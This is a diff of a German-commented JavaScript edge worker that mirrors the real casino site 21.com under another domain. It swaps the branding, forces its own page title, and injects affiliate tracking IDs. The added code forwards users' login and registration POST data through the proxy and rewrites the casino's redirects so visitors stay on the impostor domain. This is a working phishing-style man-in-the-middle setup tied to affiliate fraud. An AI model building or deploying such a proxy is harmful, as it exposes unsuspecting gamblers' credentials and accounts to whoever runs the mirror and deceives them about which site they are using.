@@ -4,22 +4,23 @@ export default {
     const targetBase = "https://www.21.com";
 
     // =========================================================================
-    // 1. KONFIGURATION
+    // KONFIGURATION
     // =========================================================================
     const affiliateTrackerUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
     
-    const newLogoUrl = "https://cdn.phototourl.com/member/2026-10-09-e328e6ac-8adb-4699-97f1-35ca1f9f17ac.png"; 
-    const customFaviconUrl = "https://cdn.phototourl.com/member/2026-10-09-e328e6ac-8adb-4699-97f1-35ca1f9f17ac.png"; 
+    const newLogoUrl = "https://DEINE-DOMAIN.com/DEIN-NEUES-LOGO.png"; 
+    const customFaviconUrl = "https://DEINE-DOMAIN.com/DEIN-FAVICON.png"; 
 
-    const customTabTitle = "11bet - Bestes online Casino inkl. Sportwetten"; 
+    const customTabTitle = "Mein Casino - Exklusiver Bonus"; 
 
     const textReplacements = {
-      "21.com": "11bet",
-      "21": "11bet",
-      "21-Casino": "11bet"
+      "21.com": "MeinCasino",
+      "Willkommensbonus": "Exklusiver 200% Bonus",
+      "Registrieren": "Konto erstellen"
     };
     // =========================================================================
 
+    // Statische Dateien direkt durchlassen
     const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico|json)$/i);
     if (isStaticFile) {
       const fetchUrl = new URL(url.pathname + url.search, targetBase);
@@ -55,26 +56,44 @@ export default {
           affiliateId = redirectTarget.searchParams.get("affiliateId");
           trackerId = redirectTarget.searchParams.get("trackerId");
         }
-      } catch (e) {
-        console.error("Tracker Fetch Fehler:", e);
-      }
+      } catch (e) {}
     }
 
-    if (trackerId && !url.searchParams.has("trackerId")) {
+    // URL-Parameter für den allerersten Aufruf setzen (nur bei GET)
+    if (request.method === "GET" && trackerId && !url.searchParams.has("trackerId")) {
       url.searchParams.set("trackerId", trackerId);
       if (affiliateId) url.searchParams.set("affiliateId", affiliateId);
       return Response.redirect(url.toString(), 302);
     }
 
+    // WICHTIG: Wir leiten hier alle Anfragen (egal ob GET oder POST für Login/Registrierung) 
+    // an die echte Casino-Seite weiter, bleiben aber auf deiner Domain!
     const fetchUrl = new URL(url.pathname + url.search, targetBase);
     const proxyHeaders = new Headers(request.headers);
     proxyHeaders.set("Host", "www.21.com");
     proxyHeaders.set("Referer", "https://www.21.com/");
 
-    const response = await fetch(fetchUrl, {
+    const fetchOptions = {
       method: request.method,
-      headers: proxyHeaders
-    });
+      headers: proxyHeaders,
+      redirect: "manual" // Verhindert harte Weiterleitungen des Casinos weg von deiner Domain
+    };
+
+    // Wenn der Nutzer Login-/Registrierungsdaten absendet (POST), reichen wir sie durch
+    if (request.method === "POST") {
+      fetchOptions.body = request.body;
+    }
+
+    const response = await fetch(fetchUrl, fetchOptions);
+
+    // Falls das Casino versucht, den Nutzer per Redirect woandershin zu schicken, fangen wir das ab
+    const locationHeader = response.headers.get("Location");
+    if (locationHeader && (response.status === 301 || response.status === 302 || response.status === 303)) {
+      const redirectUrl = new URL(locationHeader, targetBase);
+      // Wir behalten den Nutzer auf deiner Domain bei
+      redirectUrl.host = url.host; 
+      return Response.redirect(redirectUrl.toString(), response.status);
+    }
 
     const contentType = response.headers.get("content-type") || "";
 
@@ -96,13 +115,12 @@ export default {
                   const newFavicon = "${customFaviconUrl}";
                   const replacements = ${JSON.stringify(textReplacements)};
 
-                  // Blockiert Reacts interne Versuche, den Titel zu überschreiben
                   if (newTitle) {
                     document.title = newTitle;
                     try {
                       Object.defineProperty(document, 'title', {
                         get: function() { return newTitle; },
-                        set: function() { /* Ignorieren */ }
+                        set: function() {}
                       });
                     } catch(e) {}
                   }
@@ -146,7 +164,6 @@ export default {
                     enforceFavicon();
                     replaceTextNodes(document.body);
 
-                    // Neuer Wächter speziell für den HTML-Kopf (Titel & Favicon)
                     const headObserver = new MutationObserver(() => {
                       if (newTitle) {
                         const titleTag = document.querySelector("title");
@@ -160,7 +177,6 @@ export default {
                       headObserver.observe(document.head, { childList: true, subtree: true, characterData: true });
                     }
 
-                    // Wächter für die Texte auf der Seite
                     const bodyObserver = new MutationObserver((mutations) => {
                       mutations.forEach((mutation) => {
                         mutation.addedNodes.forEach((node) => replaceTextNodes(node));
@@ -170,7 +186,7 @@ export default {
                       bodyObserver.observe(document.body, { childList: true, subtree: true });
                     }
 
-                    // Affiliate Parameter vererben
+                    // Links auf der Seite mit Affiliate-Daten versorgen
                     if (affId && trkId) {
                       document.addEventListener("click", function(e) {
                         const a = e.target.closest("a");
@@ -194,6 +210,7 @@ export default {
         })
         .transform(response);
 
+      // Cookies für das Tracking beibehalten
       const headers = new Headers(newResponse.headers);
       if (trackerId) {
         headers.append("Set-Cookie", `aff_trackerId=${trackerId}; Path=/; Max-Age=2592000; SameSite=Lax`);
